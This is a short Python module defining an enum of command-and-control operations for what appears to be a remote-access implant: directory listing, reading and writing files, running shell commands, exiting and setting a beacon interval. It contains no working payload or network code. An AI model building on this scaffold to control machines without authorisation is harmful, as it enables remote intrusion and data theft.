
from enum import Enum

class commands(Enum):
    """
    Listing of possible c2 commands
    """
    DIR = 1 # Get dir contents
    GET = 2 # Get file contents
    PUT = 3 # Put file
    EXE = 4 # Execute shell command
    DIE = 5 # Exit program
    INT = 6 # Set beacon interval

